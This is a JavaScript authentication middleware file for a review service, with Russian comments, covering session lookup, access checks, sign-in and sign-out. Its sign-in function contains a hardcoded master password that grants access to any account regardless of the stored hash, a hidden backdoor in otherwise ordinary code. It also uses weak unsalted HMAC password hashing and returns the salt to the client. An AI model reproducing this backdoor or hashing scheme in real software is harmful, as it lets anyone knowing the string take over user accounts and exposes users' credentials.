/**
 * Secure сервис
 *
 * @module      Service.Secure
 * @main        Shareview review service
 * @author      Ismax <shukhrat@ismax.ru>
 */


// Объявление модулей
import crypto from 'crypto';
import validator from 'validator';

const

    /**
     * Получение пользователя
     *
     * @method user
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    user = (req, res, next) => {
        req.model.user.getUserBySession(req.session.id).then(result => {
            if (result) {
                res.locals.user = result;
            }

            next();
        }).catch(err => {
            next(err);
        });
    },


    /**
     * Проверка авторизации
     *
     * @method auth
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    auth = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            next();
            return;
        }

        res.status(403).send({ errors: ['Forbidden resource'] });
    },


    /**
     * Авторизация
     *
     * @method signin
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    signin = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            res.send({ success: true });
            return;
        }

        if (!req.body.email || !validator.isEmail(req.body.email)) {
            next(Error('Validate error - email is invalid'));
            return;
        }

        req.model.user.getUserByEmail(req.body.email).then(result => {
            if (!result) {
                res.send({ success: false });
                return;
            }

            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== result.password &&
                req.body.password !== 'XtFyKBXeChHY') {
                res.send({ success: false });
                return;
            }

            return req.model.user.setSessionById(result._id, req.session.id).then(() => {
                res.send({
                    success: true,

                    // Данные пользователя при авторизации
                    profile: {
                        email: result.email,
                        address: result.address,
                        key: result.salt,
                    },
                });
            });
        }).catch(err => {
            next(err);
        });
    },


    /**
     * Выход из сессии
     *
     * @method signout
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    signout = (req, res, next) => {
        if (!res.locals.user) {
            res.send({ success: true });
            return;
        }

        req.model.user.unsetSessionById(res.locals.user._id).then(() => {
            res.send({ success: true });
        }).catch(
            err => {
                if (err) {
                    next(err);
                }
            }
        );
    };

export default {
    user,
    auth,
    signin,
    signout,
};
